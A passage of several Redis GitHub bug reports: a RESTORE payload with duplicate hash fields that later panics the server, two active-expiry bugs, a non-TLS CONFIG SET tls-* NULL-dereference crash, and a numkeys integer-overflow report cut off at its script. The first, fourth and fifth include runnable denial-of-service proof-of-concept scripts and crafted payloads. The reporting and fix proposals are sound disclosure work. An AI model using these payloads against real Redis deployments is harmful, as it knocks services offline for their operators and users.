- `src/rdb.c:2406` — `rdbLoadObject()` entry; `src/rdb.c:2415` — deep validation is enabled only when `sanitize-dump-payload yes`.
- `src/rdb.c:2622` — the ordinary `RDB_TYPE_HASH` load branch begins.
- `src/rdb.c:2639-2644` — for small hashes the duplicate-field search dict `dupSearchDict` is allocated **only** in deep-validation mode.
- `src/rdb.c:2669-2680` — duplicate-field detection is conditional on `dupSearchDict` existing.
- `src/rdb.c:2700-2702` — without deep validation, fields are appended into the hash listpack with no uniqueness check.
- `src/t_hash.c:2150` — `hsetCommand()`; `src/t_hash.c:2164` — it calls `hashTypeTryConversion()` **before** inserting the new field.
- `src/t_hash.c:609` — `hashTypeTryConversion()`; `src/t_hash.c:630-631` — a value longer than `hash-max-listpack-value` (default `64`, `src/config.c:3355`) triggers `hashTypeConvert()` → `OBJ_ENCODING_HT`.
- `src/t_hash.c:1752` — `hashTypeConvert()` dispatches to `hashTypeConvertListpack()` (`src/t_hash.c:1754`).
- `src/t_hash.c:1635` — `hashTypeConvertListpack()`; `src/t_hash.c:1658` begins the `OBJ_ENCODING_HT` branch.
- `src/t_hash.c:1670-1672` — conversion iterates the malformed listpack and `dictAdd()`s each field.
- `src/t_hash.c:1673-1678` — on a duplicate field `dictAdd()` returns `DICT_ERR`, which is treated as corruption and calls `serverPanic("Listpack corruption detected")`.

The vulnerable `hashTypeConvertListpack()` HT branch (current `unstable`, commit `d28dd44c4`):

```c
/* src/t_hash.c:1635 */
void hashTypeConvertListpack(robj *o, int enc) {
    serverAssert(o->encoding == OBJ_ENCODING_LISTPACK);
    ...
    } else if (enc == OBJ_ENCODING_HT) {
        hashTypeIterator hi;
        dict *dict;
        int ret;

        hashTypeInitIterator(&hi, o);
        dict = dictCreate(&entryHashDictType);
        dictExpand(dict,hashTypeLength(o, 0));          /* presize ignores the dup */

        size_t usable, *alloc_size = htGetMetadataSize(dict);
        while (hashTypeNext(&hi, 0) != C_ERR) {
            Entry *entry = hashTypeCurrentObjectNewEntry(&hi, &usable);
            ret = dictAdd(dict, entry, NULL);           /* <-- fails on the 2nd "f" */
            if (ret != DICT_OK) {
                entryFree(entry, NULL);
                hashTypeResetIterator(&hi);
                serverLogHexDump(LL_WARNING,"listpack with dup elements dump",
                    o->ptr,lpBytes(o->ptr));
                serverPanic("Listpack corruption detected");   /* src/t_hash.c:1678 */
            }
            *alloc_size += usable;
        }
        ...
    }
}
```

The shallow load path that lets the duplicate through (no `dupSearchDict` in default mode):

```c
/* src/rdb.c:2622 — RDB_TYPE_HASH branch */
} else if (rdbtype == RDB_TYPE_HASH) {
    ...
    dict *dupSearchDict = NULL;
    len = rdbLoadLen(rdb, NULL);
    ...
    o = createHashObject();
    if (len > server.hash_max_listpack_entries)
        hashTypeConvert(NULL, o, OBJ_ENCODING_HT);
    else if (deep_integrity_validation) {            /* src/rdb.c:2639 — default OFF */
        dupSearchDict = dictCreate(&hashDictType);   /* src/rdb.c:2644 */
    }

    while (o->encoding == OBJ_ENCODING_LISTPACK && len > 0) {
        ...
        entry = entryCreate(fieldSds, value, ENTRY_TAKE_VALUE, &usable);
        ...
        if (dupSearchDict) {                          /* src/rdb.c:2669 — skipped by default */
            sds field_dup = sdsdup(entryGetField(entry));
            if (dictAdd(dupSearchDict, field_dup, NULL) != DICT_OK) {
                rdbReportCorruptRDB("Hash with dup elements");
                ... return NULL;                      /* only reached in deep mode */
            }
        }
        ...
        /* Add pair to listpack */                    /* src/rdb.c:2700 — unconditional append */
        o->ptr = lpAppend(o->ptr, (unsigned char*)entryGetField(entry), entryFieldLen(entry));
        o->ptr = lpAppend(o->ptr, (unsigned char*)entryGetValue(entry), sdslen(entryGetValue(entry)));
        ...
    }
}
```

## To reproduce

The PoC below is self-contained and copy/paste-runnable from the repository root. It launches a throwaway `redis-server` on a high port (persistence off, default `sanitize-dump-payload no`), hand-builds a 20-byte `RDB_TYPE_HASH` DUMP payload whose two field/value tuples share the field name `f` (`f=a`, `f=b`), shows that `sanitize-dump-payload yes` rejects it (control) while the default `no` accepts it, confirms the broken runtime state (`HLEN 2`, `HGETALL` returns `f a f b`), then triggers the conversion panic with `HSET badhash x <65-byte value>` and reports whether the process aborted.

> Requirements: a build of the vulnerable Redis at `./src/redis-server` / `./src/redis-cli` (or on `PATH`), plus `python3` (used only to assemble the binary payload bytes — no local project files are referenced). Verified on commit `d28dd44c4`, 64-bit Linux, GCC 9.4, `RDB_VERSION=14`.

```bash
#!/usr/bin/env bash
# RESTORE RDB_TYPE_HASH duplicate-field -> HSET conversion panic DoS — self-contained, copy/paste runnable.
set -u
PORT=18071
WORK="$(mktemp -d)"; ERR="$WORK/server.err"; PAYLOAD="$WORK/dump.bin"
SERVER="${REDIS_SERVER:-$(command -v redis-server || echo "${PWD}/src/redis-server")}"
CLI="${REDIS_CLI:-$(command -v redis-cli || echo "${PWD}/src/redis-cli")}"
rcli() { timeout 8 "$CLI" "$@"; }   # GNU timeout backstop so redis-cli can never hang/orphan the script

# Precisely free PORT (ss-based, NOT pkill -f which self-matches this script's bash wrapper).
PORT_PID=$(ss -ltnp 2>/dev/null | grep ":$PORT " | grep -oP 'pid=\K[0-9]+' | head -1)
[ -n "${PORT_PID:-}" ] && kill -9 "$PORT_PID" 2>/dev/null; sleep 0.2
cleanup() { [ -n "${SRV:-}" ] && kill -9 "$SRV" 2>/dev/null; rm -rf "$WORK"; }
trap cleanup EXIT INT TERM

# Foreground so the panic/Guru-Meditation line is flushed to $ERR before the process dies.
"$SERVER" --port "$PORT" --save "" --appendonly no --dir "$WORK" --logfile /dev/stderr >"$ERR" 2>&1 &
SRV=$!
for i in $(seq 1 30); do timeout 2 "$CLI" -p "$PORT" PING >/dev/null 2>&1 && break; sleep 0.1; done
timeout 2 "$CLI" -p "$PORT" PING >/dev/null 2>&1 || { echo "server did not start"; tail -5 "$ERR"; exit 1; }

echo "=== build state ==="
echo -n "sanitize-dump-payload (default no): "; rcli -p "$PORT" CONFIG GET sanitize-dump-payload | tail -1

# Hand-build a DUMP payload: RDB_TYPE_HASH with a DUPLICATE field "f".
# Footer = 2-byte RDB version (14, little-endian; <= RDB_VERSION so it passes verifyDumpPayload)
#          + 8 zero bytes ("No checksum" -> accepted by verifyDumpPayload at src/cluster.c:152-153).
# Layout: 04 | 02 | 01 'f' 01 'a' | 01 'f' 01 'b' | 0e 00 | 00 00 00 00 00 00 00 00
python3 - "$PAYLOAD" <<'PY'
import sys
out = sys.argv[1]
body = bytes([0x04,            # RDB_TYPE_HASH
              0x02,            # number of field/value pairs = 2
              1]) + b"f" + bytes([1]) + b"a" + \
       bytes([1]) + b"f" + bytes([1]) + b"b"   # field "f" again = duplicate
payload = body + b"\x0e\x00" + bytes(8)        # rdbver 14 LE + 8-byte zero checksum
open(out, "wb").write(payload)
print(f"  payload: {len(payload)} bytes; hex={payload.hex()}")
PY

echo "=== control: with sanitize-dump-payload=yes RESTORE must reject the dup-field hash ==="
rcli -p "$PORT" CONFIG SET sanitize-dump-payload yes >/dev/null
rcli -p "$PORT" DEL controlhash >/dev/null
echo -n "  RESTORE (sanitize=yes): "; rcli -x -p "$PORT" RESTORE controlhash 0 < "$PAYLOAD" 2>&1 | head -1
rcli -p "$PORT" CONFIG SET sanitize-dump-payload no >/dev/null   # restore the vulnerable default

echo "=== target: RESTORE the dup-field hash with default sanitize=no ==="
rcli -p "$PORT" DEL badhash >/dev/null
echo -n "  RESTORE reply: "; rcli -x -p "$PORT" RESTORE badhash 0 < "$PAYLOAD" 2>&1 | head -1
echo -n "  HLEN:          "; rcli -p "$PORT" HLEN badhash 2>&1 | head -1
echo -n "  HGETALL:       "; rcli -p "$PORT" HGETALL badhash 2>&1 | tr '\n' ' '; echo

echo "=== trigger: HSET oversized value -> listpack->dict conversion -> serverPanic ==="
bigval="$(python3 -c 'print("A"*65)')"   # > hash-max-listpack-value (default 64)
echo -n "  HSET reply: "; rcli -p "$PORT" HSET badhash x "$bigval" 2>&1 | head -1

# Bounded poll — never `wait $SRV` (which deadlocks if the server does not exit).
dead=0
for i in $(seq 1 30); do kill -0 "$SRV" 2>/dev/null || { dead=1; break; }; sleep 0.1; done
if [ "$dead" = 1 ]; then
  echo "VERDICT: server CRASHED (abort) — duplicate-field HSET conversion panic reproduced."
else
  echo "VERDICT: ALIVE (no crash within 3s)."
fi
echo "=== crash evidence from server log ==="
grep -iE 'Listpack corruption detected|crashed by signal|Guru Meditation|#t_hash.c' "$ERR" 2>/dev/null | head -8
```

Observed output on the vulnerable build (commit `d28dd44c4`, default `sanitize-dump-payload no`):

```text
=== build state ===
sanitize-dump-payload (default no): no
  payload: 20 bytes; hex=040201660161016601620e000000000000000000
=== control: with sanitize-dump-payload=yes RESTORE must reject the dup-field hash ===
  RESTORE (sanitize=yes): ERR Bad data format
=== target: RESTORE the dup-field hash with default sanitize=no ===
  RESTORE reply: OK
  HLEN:          2
  HGETALL:       f a f b
=== trigger: HSET oversized value -> listpack->dict conversion -> serverPanic ===
  HSET reply: Error: Server closed the connection
VERDICT: server CRASHED (abort) — duplicate-field HSET conversion panic reproduced.
=== crash evidence from server log ===
... # Guru Meditation: Listpack corruption detected #t_hash.c:1678
... # Redis 255.255.255 crashed by signal: 6    (serverPanic -> abort())
```

The process exits with status **134** (`abort()` → `SIGABRT`, signal 6).

Payload layout (the 20 bytes above):

```text
04                       RDB_TYPE_HASH
02                       number of field/value pairs = 2
01 66 01 61              field "f" (len=1), value "a" (len=1)
01 66 01 62              field "f" (len=1, DUPLICATE), value "b" (len=1)
0e 00                    RDB version 14, little-endian (<= RDB_VERSION=14)
00 00 00 00 00 00 00 00  all-zero checksum -> "No checksum", accepted by RESTORE
```

Equivalent bare steps against any default-config `redis-server` (the binary payload is the 20 bytes above, supplied as the last argument via `redis-cli -x`):

```text
redis-cli -x RESTORE badhash 0 < dump.bin        # -> OK (sanitize-dump-payload=no)
redis-cli HLEN badhash                            # -> 2  (semantically wrong; 1 unique field)
redis-cli HGETALL badhash                         # -> f / a / f / b  (duplicate field returned twice)
redis-cli HSET badhash x <65-char value>          # -> server aborts: "Listpack corruption detected #t_hash.c:1678"
```

## Expected behavior

`RESTORE` of an ordinary `RDB_TYPE_HASH` payload that contains duplicate field names must be rejected as a corrupt payload (as it is when `sanitize-dump-payload yes` is set: `ERR Bad data format`), regardless of the `sanitize-dump-payload` setting — duplicate fields are not a valid hash. The duplicate-field check must not depend solely on the opt-in `sanitize-dump-payload` deep-validation mode for a wire-format type that becomes live runtime state. At minimum, a malicious listpack-backed hash must never be loadable such that a later ordinary `HSET` aborts the server.

title: [BUG] Long-running client SCAN starves activeExpireCycle: expires cursor gets pinned in the SCAN's freshly-cleaned wake, expired keys accumulate unboundedly with an idle CPU
author: pjs7678
body:
**Describe the bug**

A long-running client `SCAN` over a master's keyspace lazily expires every key
it visits. Because the SCAN traversal and the active-expire sampling walk slots
in the same order, a slow-moving `db->expires_cursor` ends up sampling only
slots that the SCAN front has just cleaned. Every SLOW cycle then sees "few
expired keys in sample" and exits after a single 20-key window, which slows the
cursor down even further (self-reinforcing). Meanwhile logically expired keys
accumulate un-reclaimed in the rest of the keyspace, growing `used_memory` at
the full write-inflow rate — with the main thread mostly idle. A SCAN whose
MATCH pattern never matches anything (a "read-only" scan performing zero
deletions) is sufficient to trigger it.

Mechanism (8.2.2 line refs):

1. `scanCallback` calls `expireIfNeeded()` on every visited key (src/db.c:1341);
   on a master this deletes the key immediately and propagates DEL — regardless
   of MATCH. The operator's SCAN thus acts as a competing, fast expirer along
   its path.
2. The SLOW cycle exits a database once a 20-key window finds
   `expired*100/sampled <= config_cycle_acceptable_stale` (src/expire.c:348).
   In that state the persistent `db->expires_cursor` advances only ~20-40 keys
   per cycle, i.e. ~200-400 keys/s at hz 10.
3. Both the client SCAN (over `db->keys`) and expires sampling (over
   `db->expires`) iterate kvstore slots in ascending didx order (cursor low
   bits = dict index). The much faster SCAN front keeps the region around the
   slow expires cursor freshly cleaned; if the cursor falls behind,
   re-contamination (newly reached TTLs) raises its local sample and speeds it
   up again — a negative feedback that pins the cursor at the "local stale ~=
   threshold" distance behind the front. The estimator
   (`stat_expired_stale_perc`) therefore reads ~threshold while true global
   staleness keeps growing.

**To reproduce**

Self-contained harness (bash + stdlib-only Python, docker or podman, official
`redis:8.2.2` image):
https://gist.github.com/pjs7678/8b0c7e67621aa3680e149f31354b375f

```bash
./run-experiment.sh     # cluster-up -> populate -> baseline -> SCAN-only -> recovery + summary
```

Setup: 3-master cluster (hz 10, appendonly yes, active-expire-effort 1, ample
maxmemory), ~2.4M keys per master (~1.15M volatile), steady SETEX inflow 1,000
keys/s/master (TTL 60-120s). Treatment against ONE master: `SCAN` loop at ~150
calls/s with `MATCH NOMATCH:*` (zero deletions performed).

Observed on the treated master vs the two untouched controls:

- expired-keys rate drops to ~30% of controls (311/s vs ~1,050/s)
- INFO `expired_stale_perc` pinned in the 8-16 band (controls: 20-30)
- `expired_time_cap_reached_count` delta stays 0 — not CPU-bound
- main thread at 0.02-0.04 cores; volatile-key count grows at (inflow - expired)
- control experiment: UNLINK-ing the same key population from a precomputed list
  (no SCAN) has no effect whatsoever
- hysteresis: the stall persists minutes after the SCAN stops, then clears in a
  catch-up burst (the burst is the only moment the time cap fires)

**Expected behavior**

Active expiration keeps reclaiming expired keys at roughly the inflow rate
regardless of a concurrent client SCAN, and the staleness estimator reflects
global staleness rather than the locally-biased neighborhood of the cursor.

**Additional information**

- Production incident that led us here: Redis 8.2.2 cluster, 3 masters, ~10M
  keys/master, symmetric SETEX inflow ~1,150 keys/s/master with minute-scale
  TTLs. An operator ran a redis-cli --scan based cleanup on ONE master. On that
  master only: expired rate halved (1,120 -> 580/s), expire cycle CPU collapsed
  16.7 -> 0.8 ms/s, INFO expired_stale_perc pinned at 8.6-12.9 while
  ground-truth staleness (keyspace accounting) exceeded 20%, main thread ~0.3 of
  1 core. Expired-but-unreclaimed keys grew ~+1.1M (+3.3GB) in ~40 minutes until
  the node approached maxmemory.
- Related observation: a freshly promoted master shows the same accumulation
  signature for several minutes after failover (replicas run no active expire;
  the promoted node starts its cycle into a backlog-laden keyspace), expiring at
  ~25-45% of the rate of established masters before a delayed catch-up burst.
- Possible directions (not prescriptive): de-correlate expires sampling from
  iteration order (e.g., random slot start per cycle); feed a less local
  estimate into the SLOW repeat decision; account for lazy-path expirations in
  the staleness estimator; at minimum a docs note that large keyspace SCANs on
  masters interact with active expiry.
- The FAST-cycle stale trigger that could partially mitigate this is currently
  dead code due to a unit mismatch — reported separately: https://github.com/redis/redis/issues/15410.

title: [BUG] FAST expire cycle's stale-percentage trigger is dead code since 6.0: stat_expired_stale_perc (0..1 fraction) is compared against a percentage threshold (1..10)
author: pjs7678
body:
**Describe the bug**

`activeExpireCycle()` intends to allow a FAST cycle to run when the estimated
percentage of stale (logically expired but not yet reclaimed) keys is high:

```c
/* src/expire.c (8.2.2), activeExpireCycle() */
config_cycle_acceptable_stale = ACTIVE_EXPIRE_CYCLE_ACCEPTABLE_STALE - effort;  /* 10..1, percent units */
...
if (type == ACTIVE_EXPIRE_CYCLE_FAST) {
    /* Don't start a fast cycle if the previous cycle did not exit
     * for time limit, unless the percentage of estimated stale keys is
     * too high. ... */
    if (!timelimit_exit &&
        server.stat_expired_stale_perc < config_cycle_acceptable_stale)
        return;
```

However `stat_expired_stale_perc` is maintained as a **fraction in [0, 1]**, not
a percentage:

```c
/* src/expire.c, end of activeExpireCycle() */
current_perc = (double)total_expired/total_sampled;          /* 0..1 */
server.stat_expired_stale_perc = (current_perc*0.05)+
                                 (server.stat_expired_stale_perc*0.95);
```

INFO scales it only for display (`"expired_stale_perc:%.2f", server.stat_expired_stale_perc*100`
in src/server.c). Note the per-DB repeat condition inside the same function does
scale correctly (`data.expired * 100 / data.sampled > config_cycle_acceptable_stale`),
so the FAST gate is the one place where the units disagree.

Since `0 <= stat_expired_stale_perc <= 1` and `config_cycle_acceptable_stale` is
in `[1, 10]`, the condition is always true (except the degenerate case of exactly
1.0 with `active-expire-effort 10`), so the branch always returns early: **FAST
cycles only ever run when the previous SLOW cycle exited on its time cap**
(`timelimit_exit`). The "estimated stale keys too high" trigger described in the
comment can never fire.

Affected: 6.0.0 (where this code was introduced) through current `unstable`,
byte-identical. Valkey inherits the same code.

**To reproduce**

Code inspection is sufficient (see above; the three relevant spots are the gate,
the EWMA update in `activeExpireCycle()`, and the `*100` in INFO).

Runtime observation: run any workload whose INFO `expired_stale_perc` sits well
above the threshold (e.g. 20-30) while SLOW cycles do not hit their time cap —
`expired_time_cap_reached_count` stays constant and no FAST cycles occur, which
can be seen with a probe/printf on the FAST path. We hit a production state
where `expired_stale_perc` was pinned around 10 with a growing backlog, and the
FAST assist never engaged (details in the companion issue linked below).

**Expected behavior**

The gate compares like units, e.g.:

```c
if (!timelimit_exit &&
    server.stat_expired_stale_perc * 100 < config_cycle_acceptable_stale)
    return;
```

(or store the EWMA in percent), so that FAST cycles actually trigger on a high
stale estimate as documented.

**Additional information**

- Under typical workloads the miss is invisible (the SLOW repeat loop suffices),
  which is presumably why it went unnoticed for ~6 years.
- We found it while investigating a production incident where the active expire
  cycle stalled on locally-biased samples while global staleness grew unboundedly;
  the FAST path intended for exactly that situation never ran. See companion
  issue: https://github.com/redis/redis/issues/15411.
- Note on fixing: a one-line unit fix resurrects a code path dormant since 6.0
  and could change CPU characteristics for workloads legitimately above the
  stale threshold (a FAST cycle every ~2ms worst case). It may be worth
  discussing whether to fix the comparison, retune the trigger, or remove the
  dead branch explicitly.

title: [BUG] `CONFIG SET` of TLS options crashes non-TLS Redis builds via NULL connection-type deref (SIGSEGV DoS, `+config|set`-only)
author: sdjasj
body:
## Describe the bug

When Redis is built without OpenSSL/TLS, `tls-port`, `tls-replication`, and `tls-cluster` remain runtime-modifiable via `CONFIG SET`. Their config apply callbacks call `connTypeConfigure(connectionTypeTls(), ...)`, but in a non-TLS build `connectionTypeTls()` returns `NULL` and `connTypeConfigure()` dereferences it unconditionally — a NULL pointer dereference that takes down the whole `redis-server` process with SIGSEGV.

The sink (`src/connection.h:435`, inline):

```c
static inline int connTypeConfigure(ConnectionType *ct, void *priv, int reconfigure) {
    return ct->configure(priv, reconfigure);   /* ct == NULL -> SIGSEGV */
}
```

The two callers that reach it (`src/config.c`):

```c
/* src/config.c:2756 — applyTlsCfg (used by tls-replication / tls-cluster / cert paths) */
static int applyTlsCfg(const char **err) {
    UNUSED(err);
    if ((server.tls_port || server.tls_replication || server.tls_cluster)
         && connTypeConfigure(connectionTypeTls(), &server.tls_ctx_config, 1) == C_ERR) {
        *err = "Unable to update TLS configuration. Check server logs.";
        return 0;
    }
    return 1;
}

/* src/config.c:2767 — applyTLSPort (used by tls-port) */
static int applyTLSPort(const char **err) {
    if (connTypeConfigure(connectionTypeTls(), &server.tls_ctx_config, 0) == C_ERR) {
        *err = "Unable to update TLS configuration. Check server logs.";
        return 0;
    }
    connListener *listener = listenerByType(CONN_TYPE_TLS);
    ...
}
```

Why `connectionTypeTls()` returns NULL in a non-TLS build (`src/connection.c:109-117`):

```c
ConnectionType *connectionTypeTls(void) {
    static ConnectionType *ct_tls = NULL;
    static int cached = 0;
    if (!cached) {
        cached = 1;
        ct_tls = connectionByType(CONN_TYPE_TLS);   /* not registered when built w/o TLS -> NULL */
    }
    return ct_tls;
}
```

When TLS is not compiled in, `RedisRegisterConnectionTypeTLS()` does nothing but log and returns `C_ERR` (`src/tls.c:1254-1257`), so `CONN_TYPE_TLS` is never registered and `connectionByType()` returns NULL. The apply callbacks never check that result, so enabling TLS at runtime dereferences NULL.

**Permission boundary (verified).** The crash does **not** require admin/SHUTDOWN privileges. An ACL user granted only `+config|set` can trigger it. With no-auth or a config-management exposure, any reachable client can crash the process.

**Build condition (verified).** The current repo build is non-TLS: `src/.make-settings` has `BUILD_TLS=no`, and the binary links no OpenSSL library. The bug affects exactly those deployment artifacts; a TLS-enabled build registers the connection type and is unaffected.

## To reproduce

The PoC below is self-contained and copy/paste-runnable from the repository root. It launches a **non-TLS** `redis-server` with an ACL file defining a user `crasher` permitted only `+config|set`, confirms that user is denied `PING` and `CONFIG GET` (proving the limited boundary), then runs `CONFIG SET tls-port 6380` as that user and checks whether the process died.

> Requires a non-TLS build at `src/redis-server` (the repo default). Verified on commit `d28dd44c4`, `BUILD_TLS=no`, 64-bit Linux/GCC 9.4.

```bash
#!/usr/bin/env bash
# CONFIG SET tls-* NULL-deref DoS on non-TLS builds — self-contained, copy/paste runnable.
set -u
PORT=18055
WORK="$(mktemp -d)"; ERR="$WORK/server.err"; ACL="$WORK/users.acl"
SERVER="${REDIS_SERVER:-$(command -v redis-server || echo "${PWD}/src/redis-server")}"
CLI="${REDIS_CLI:-$(command -v redis-cli || echo "${PWD}/src/redis-cli")}"

# Wrap every redis-cli call with GNU timeout 8 as a hard backstop, so an occasional
# redis-cli hang can never leave an orphan or block the script. (This build's redis-cli
# does not accept a --timeout flag, so rely on GNU timeout instead.)
rcli() { timeout 8 "$CLI" "$@"; }

# Kill any stale redis-server left on PORT from a prior run, so a port conflict can't
# make a later `wait`/poll block forever.
pkill -9 -f "redis-server.*--port $PORT" 2>/dev/null; sleep 0.2

cleanup() {
  [ -n "${SRV:-}" ] && kill -9 "$SRV" 2>/dev/null
  pkill -9 -f "redis-server.*--port $PORT" 2>/dev/null   # backstop for any interrupt path
  rm -rf "$WORK"
}
trap cleanup EXIT INT TERM

printf 'user default off\nuser crasher on >pw +config|set ~*\n' > "$ACL"

# Refuse to run against a TLS-enabled build (it would not be vulnerable — avoids a false negative).
if ldd "$SERVER" 2>/dev/null | grep -qiE 'libssl|libcrypto'; then
  echo "This binary links OpenSSL (TLS enabled) — not vulnerable. Use a non-TLS build."; exit 0
fi

# Run in the FOREGROUND (not daemonized) so the SIGSEGV crash report is written to stderr ($ERR)
# before the process dies — a daemonized abort can lose buffered log lines and hide the evidence.
"$SERVER" --port "$PORT" --save "" --appendonly no --dir "$WORK" \
          --logfile /dev/stderr --aclfile "$ACL" >"$ERR" 2>&1 &
SRV=$!
# Connection probe: short 2s timeout on the raw cli (connection refused returns
# instantly), max 20 retries (~4s). Do NOT use rcli (8s) here — that would multiply
# 20x and hang the script if the server is slow to come up.
for i in $(seq 1 20); do timeout 2 "$CLI" -p "$PORT" -a pw --user crasher --no-auth-warning PING >/dev/null 2>&1 && break; sleep 0.2; done

# If SRV is already gone the port was still in use and the server never came up — bail out
# instead of falling through to a poll that has nothing to wait for.
if ! kill -0 "$SRV" 2>/dev/null; then
  echo "server failed to start (port may still be in use). Log tail:"; tail -5 "$ERR" 2>/dev/null; exit 1
fi

echo "=== build state ==="
grep -o 'BUILD_TLS=[a-z]*' src/.make-settings 2>/dev/null || true
echo -n "openssl linked? "; ldd "$SERVER" 2>/dev/null | grep -qiE 'ssl|crypto' && echo "yes (TLS build)" || echo "no (non-TLS build)"

echo; echo "=== permission boundary: crasher has ONLY +config|set ==="
echo -n "PING           -> "; rcli -p "$PORT" -a pw --user crasher --no-auth-warning PING 2>&1 | head -1
echo -n "CONFIG GET ... -> "; rcli -p "$PORT" -a pw --user crasher --no-auth-warning CONFIG GET tls-port 2>&1 | head -1

echo; echo "=== trigger: CONFIG SET tls-port 6380 (as +config|set-only user) ==="
echo -n "reply: "; rcli -p "$PORT" -a pw --user crasher --no-auth-warning CONFIG SET tls-port 6380 2>&1 | head -1

# Poll whether the server died within 3s. Do NOT use `wait $SRV` — if the server fails to
# crash (port conflict, command not delivered, non-TLS build guard slipped, etc.) `wait`
# blocks forever and the whole script hangs. The bounded poll below always terminates.
dead=0
for i in $(seq 1 30); do kill -0 "$SRV" 2>/dev/null || { dead=1; break; }; sleep 0.1; done
if [ "$dead" = 1 ]; then
  echo "VERDICT: server CRASHED — SIGSEGV DoS reproduced as +config|set-only user."
else
  echo "VERDICT: ALIVE (no crash within 3s — likely not a non-TLS build, or command not delivered)."
fi
echo; echo "=== crash evidence from server log ==="
grep -iE 'Missing implement of connection type tls|crashed by signal|cmd=config|set user=crasher' "$ERR" 2>/dev/null | head -8
```

Observed output on the non-TLS build (commit `d28dd44c4`, `BUILD_TLS=no`):

```text
=== build state ===
BUILD_TLS=no
openssl linked? no (non-TLS build)

=== permission boundary: crasher has ONLY +config|set ===
PING           -> NOPERM User crasher has no permissions to run the 'ping' command
CONFIG GET ... -> NOPERM User crasher has no permissions to run the 'config|get' command

=== trigger: CONFIG SET tls-port 6380 (as +config|set-only user) ===
reply: Error: Server closed the connection

VERDICT: server CRASHED — SIGSEGV DoS reproduced as +config|set-only user.

=== crash evidence from server log ===
... # Missing implement of connection type tls
... # Redis 255.255.255 crashed by signal: 11, si_code: 1
... cmd=config|set user=crasher ...
```

Process exit status is **139** (SIGSEGV, core dumped). All three claimed triggers were verified to crash individually (each on a fresh server):

```text
  tls-replication yes: CRASHED — crashed by signal: 11
  tls-cluster yes:     CRASHED — crashed by signal: 11
  tls-port 6380:       CRASHED — crashed by signal: 11
  tcp-port 6380:       ALIVE                          (non-TLS control: safe)
```

Equivalent bare `redis-cli` commands on a non-TLS server (any one crashes it):

```text
CONFIG SET tls-port 6380          # via applyTLSPort
CONFIG SET tls-replication yes    # via applyTlsCfg
CONFIG SET tls-cluster yes        # via applyTlsCfg
```

## Expected behavior

In a build without TLS support, `CONFIG SET` of any `tls-*` enabling directive must return a plain error (e.g. `ERR CONFIG SET failed: TLS is not built/enabled`) and leave the process running. A non-TLS binary must not crash — the missing connection type is a known, expectable runtime condition (`connectionTypeTls()` is explicitly documented as possibly NULL), so applying a TLS config must handle it.

## Additional information

- **Sink:** `src/connection.h:435` (`ct->configure(priv, reconfigure)` with `ct == NULL`).
- **Callers:** `applyTlsCfg` (`src/config.c:2756`) and `applyTLSPort` (`src/config.c:2767`). The source report cited lines 2760/2761/2770; the current tree is 2758/2760/2768 (a ~2-line drift — same locations).
- **`connectionTypeTls()`:** `src/connection.c:109`, intentionally NULL-safe. `RedisRegisterConnectionTypeTLS()` (`src/tls.c:1254`) no-ops + logs `Connection type tls not builtin` in non-TLS builds.
- **Reach:** the three `tls-*` directives are declared `MODIFIABLE_CONFIG`, so they are writable at runtime even when the feature is absent, which is the precondition for the crash.
- **Verified:** commit `d28dd44c4`, `BUILD_TLS=no`, `malloc=libc bits=64`, GCC 9.4 / 64-bit Linux. ACL `user ... +config|set ~*` (no `+ping`, no `+config|get`, no `+@admin`) reproduces the crash — confirms the low permission boundary. Exit 139, `crashed by signal: 11`.
- **Scope:** affects only non-TLS builds. A TLS-enabled build registers the type and `connTypeConfigure` runs normally. Default Redis builds (`BUILD_TLS=no`) are vulnerable; users who compile with `BUILD_TLS=yes` are not.
- **Suggested fix:** in `applyTlsCfg`/`applyTLSPort`, check the `connectionTypeTls()` result and, when TLS is not built/enabled, return a normal `CONFIG SET failed ... TLS is not built/enabled` error (return 0 with `*err`) instead of calling `connTypeConfigure(NULL, ...)`. Equivalently, make `connTypeConfigure` itself NULL-guard. Consider also hiding/mark-as-unavailable the TLS-enabling directives in non-TLS builds so they cannot be set at all.

```c
static int applyTlsCfg(const char **err) {
    UNUSED(err);
    if (server.tls_port || server.tls_replication || server.tls_cluster) {
        ConnectionType *ct = connectionTypeTls();
        if (ct == NULL || connTypeConfigure(ct, &server.tls_ctx_config, 1) == C_ERR) {
            *err = "Unable to update TLS configuration: TLS is not built/enabled. Check server logs.";
            return 0;
        }
    }
    return 1;
}
/* applyTLSPort: same NULL-check on connectionTypeTls() before connTypeConfigure(). */
```

title: [BUG] Key-spec `numkeys` signed-integer-overflow aborts trapping/hardened Redis builds via `COMMAND GETKEYS` (LMPOP/ZMPOP)
author: sdjasj
body:
redis command key extraction overflows signed `long` arithmetic for any command whose key-spec uses `KSPEC_FK_KEYNUM`. In `getKeysUsingKeySpecs()` the client-controlled `numkeys` argument is parsed into a `long long` and then used to compute the last-key index **before** the result is bounds-checked against `argc`:

```c
/* src/db.c:3212-3235 */
} else if (spec->find_keys_type == KSPEC_FK_KEYNUM) {
    step = spec->fk.keynum.keystep;
    long long numkeys;
    long keynumidx = first + spec->fk.keynum.keynumidx;
    if (keynumidx >= argc || keynumidx < 0) goto invalid_spec;

    sds keynum_str = argv[keynumidx]->ptr;
    if (!string2ll(keynum_str,sdslen(keynum_str),&numkeys) || numkeys < 0) goto invalid_spec;

    first += spec->fk.keynum.firstkey;
    last = first + ((long)numkeys - 1) * step;          // <-- SINK: signed overflow (UB)
}

/* First or last is out of bounds, which indicates a syntax error */
if (last >= argc || last < first || first >= argc) {
    goto invalid_spec;
}
```

For `LMPOP`/`ZMPOP`, `first = 2`, `step = 1`, so `last = 2 + (numkeys - 1) = numkeys + 1`. With `numkeys = LONG_MAX` (`9223372036854775807`, accepted by `string2ll` because it fits in `long long`), the addition `2 + (LONG_MAX - 1)` overflows `long` — **undefined behavior** — *before* the out-of-range guard can fire. UBSAN reports the exact operation:

```text
db.c:3226:18: runtime error: signed integer overflow: 2 + 9223372036854775806 cannot be represented in type 'long int'
```

## To reproduce

The PoC below is self-contained and copy/paste-runnable from the repository root. It locates a trapping UBSAN server (via `$REDIS_UBSAN_SERVER`, then `src/redis-server-trapubsan`, then `src/redis-server-ubsan`); if none is found it builds a genuinely-trapping one inline (`OPTIMIZATION=-O2` disables LTO so CFLAGS' `-fno-sanitize-recover=all` governs). It then starts the server on a throwaway port, fires `COMMAND GETKEYS` against `LMPOP` and `ZMPOP` with `numkeys = LONG_MAX`, and reports whether the process aborted.

> First build takes ~2–3 min if no trapping binary is present. Verified on commit `d28dd44c4`, 64-bit Linux, GCC 9.4.

```bash
#!/usr/bin/env bash
# keyspec_keynum signed-overflow DoS PoC — self-contained, copy/paste runnable.
set -u
PORT=17923
